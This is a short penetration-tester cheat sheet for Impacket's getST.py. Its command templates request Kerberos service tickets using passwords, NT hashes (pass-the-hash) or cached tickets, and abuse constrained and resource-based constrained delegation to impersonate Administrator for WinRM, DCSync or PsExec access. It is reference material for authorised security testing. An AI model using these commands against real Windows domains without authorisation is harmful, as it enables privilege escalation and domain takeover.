# getST.py (imp)

% impacket-kerberos, windows, kerberos, 88, delegation, TGS

#plateform/linux #target/remote  #cat/UTILS

## desc
```
request a Service Ticket and save it as ccache. If the account has constrained delegation (with protocol transition) privileges you will be able to use the -impersonate switch to request the ticket on behalf another user
```


## request TGS (creds)
```bash
getST.py -debug -spn <svc>/<target_fqdn> -dc-ip <dc_fqdn> <domain_fqdn>/<user>:'<password>'
```

## request TGS (pth)
```bash
getST.py -debug -spn <svc>/<target_fqdn> -hashes :<nt_hash> <domain_fqdn>/<user>
```

## request TGS (ptt)
```bash
KRB5CCNAME=<ccache> getST.py -debug -k -no-pass -spn <svc>/<target_fqdn> -dc-ip <domain_fqdn> <user>
```

#cat/ATTACK/DELEGATION 

## request Silver ticket (constrained delegation with protocol transition)
HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
```bash
getST.py -debug -spn <svc>/<target_fqdn> -impersonate <target_user|Administrator> -dc-ip <dc_ip> <domain_fqdn>/<user>:'<password>'
```

## Silver ticket (Resource-Based Constrained Delegation S4U2self)
using the machine account TGT
```bash
KRB5CCNAME=<computer_ccache>
getST.py -debug -self -impersonate "DomainAdmin" -altservice "cifs/<target_fqdn>" -k -no-pass -dc-ip <dc_ip> <domain_fqdn>/'<computer>$' 
```
